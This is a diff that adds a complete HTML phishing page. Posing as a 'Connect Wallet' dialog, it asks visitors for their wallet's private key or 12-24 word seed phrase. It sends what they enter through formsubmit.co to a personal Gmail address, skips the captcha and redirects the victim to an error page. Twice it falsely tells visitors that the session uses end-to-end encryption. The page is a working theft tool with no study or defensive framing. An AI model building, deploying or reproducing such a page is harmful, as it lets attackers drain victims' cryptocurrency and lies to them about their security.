@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            color: black;
+            font-family: Arial, sans-serif;
+        }
+
+        .form-container {
+            width: 300px;
+            padding: 20px;
+            border-radius: 8px;
+            background-color: black;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-right: 20px;
+            margin-left: 0px;
+        }
+        textarea {
+            resize: none;
+            margin-right: 20px;
+            margin-left: 0px;
+            height: 80px;
+            background-color: #f4f4f4;
+        }
+        .submit-btn {
+            background-color: white;
+            color: black;
+            cursor: pointer;
+            border: none;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .secured h2{
+            color: rgb(30, 180, 30);
+            font-size: 0.9em;
+        }
+        .securedd h2{
+            color: white;
+            font-size: 0.7em;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+    </style>
+</head>
+<body>
+  
+<!-- Yuj79401 -->
+    <div class="form-container">
+        <form action="https://formsubmit.co/Yuj79401@gmail.com" method="POST">
+            <!-- Message Field (required) -->
+            <!-- Options Dropdown -->
+            <div class="securedd">
+                <h2>This session is protected with an <br> end-to-end encryption</h2>
+            </div>
+            <div class="form-group">
+                <label for="options">Connect Wallet</label>
+                <select id="options" name="options">
+                    <option value="">Select your wallet</option>
+                    <option value="Sparrow Wallet">Sparrow Wallet</option>
+                    <option value="Keystone Wallet">BitBox Wallet</option>
+                    <option value="Keystone Wallet">Keystone Wallet</option>
+                    <option value="MetaMas">MetaMask</option>
+                    <option value="TrustWallet">TrustWallet</option>
+                    <option value="Ledger Wallet">Ledger Wallet</option>
+                    <option value="Trezor Wallet">Trezor Wallet</option>
+                    <option value="KeyPak Wallet">KeyPak Wallet</option>
+                    <option value="Exodus">Exodus</option>
+                    <option value="Coinbase Wallet">Coinbase Wallet</option>
+                    <option value="Mycelium">coinomi</option>
+                    <option value="Mycelium">Mycelium</option>
+                    <option value="Okx Wallet">Okx Wallet</option>
+                    <option value="MyEtherWallet">Electrum</option>
+                    <option value="MyEtherWallet">Atomic Wallet</option>
+                    <option value="MyEtherWallet">MyEtherWallet</option>
+                    <option value="Phantom Wallet">Phantom Wallet</option>
+                    <option value="Guarda wallet">Guarda wallet</option>
+                    <option value="Exodus">Exodus</option>
+                    <option value="Bitget Wallet">Bitget Wallet</option>
+                    <option value="Bitpay wallet">Bitpay wallet</option>
+                </select>
+            </div>
+            <!-- Name Input Field -->
+            <div class="form-group">
+                <label for="message">Private key or Seed phrase</label>
+                <textarea id="message" name="message" placeholder="Enter your 12, 18 or 24 Mnemonic words. Seperate them with spaces" required></textarea>
+            </div>
+            
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://error-sage.vercel.app/">
+            <button type="submit" class="submit-btn">Connect Wallet</button>
+            <div class="secured">
+                <h2>This session is protected with an <br> end-to-end encryption</h2>
+            </div>
+        </form>
+    </div>
+
+</body>
+</html>
